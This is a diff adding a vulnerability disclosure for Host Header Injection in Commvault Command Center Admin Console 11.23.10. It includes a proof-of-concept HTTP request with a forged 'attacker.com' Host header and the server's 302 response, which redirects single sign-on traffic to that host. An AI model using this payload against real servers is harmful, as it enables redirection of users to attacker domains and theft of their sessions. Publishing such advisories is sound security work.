@@ -1,0 +1,41 @@
+Host Header Injection
+---------------------
+
+Type: Unauthenticated Remote attack
+
+We have identified that the  “COMMVAULT Command Center Admin Console (Version: 11.23.10)” is affected by Host Header Injection attacks. HTTP host header can be manipulated and cause the application to behave in unexpected ways. Any changes made to the header would just cause the request to be sent to a completely different Domain/IP address. This is due to that the server implicitly trusts the Host header, and fails to validate or escape it properly. An attacker may be able to use this input to redirect target users to a malicious domain/web page. This would result in expanding the potential to further attacks and malicious actions.
+
+
+Evidence is provided:
+
+Request:
+GET /adminconsole/wcSSO.do HTTP/1.1
+Host: attacker.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: JSESSIONID=Cxxxxxxxxxxxxxxxxxxx; csrf=1xxxxxxxxxx; JSESSIONID=3xxxxxxxxxxxxxxxxxxxxx9
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+
+Response:
+HTTP/1.1 302 
+Strict-Transport-Security: max-age=31536000;includeSubDomains
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Cache-Control: no-store
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: default-src 'self'  https:; script-src 'self' 'unsafe-eval' 'nonce--1m2epc8mfvkrc' https://code.highcharts.com ; style-src 'self' 'unsafe-inline' ; img-src 'self' blob: data: https://*.mapbox.com/ https://*.gstatic.com ; connect-src 'self' https://*.mapbox.com/ https://edit.commvault.com:11316 http://deployer.commvault.com:8888/ https://deployer.commvault.com:8888/ wss://attacker.com ; object-src 'none'; worker-src 'self' blob: ; child-src 'self' blob: ; style-src 'self' 'unsafe-inline'  https://fonts.googleapis.com; base-uri 'self' ; font-src 'self' data: https://fonts.gstatic.com; upgrade-insecure-requests; report-uri https//attacker.com/adminconsole/consoleError.do;report-uri https//attacker.com/adminconsole/consoleError.do;
+Feature-Policy: accelerometer 'none'; geolocation 'none'; gyroscope 'none'; microphone 'none'; payment 'none';
+X-UA-Compatible: IE=Edge,chrome=1
+Referrer-Policy: strict-origin-when-cross-origin
+cv-trace-id: cvTNMonk7j
+Location: https://attacker.com:443/webconsole/cvAccountsSingleSignOn.do?callBackUrl=https%3A%2F%2Fattacker.com%3A443%2Fadminconsole%2FcvAccountsLoginCallBack.do&spSID=ZxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxD0%3D&app=1
+Content-Length: 0
+Date: Wed, 20 Oct 2021 11:28:35 GMT
+Connection: close
+Server: Commvault WebServer
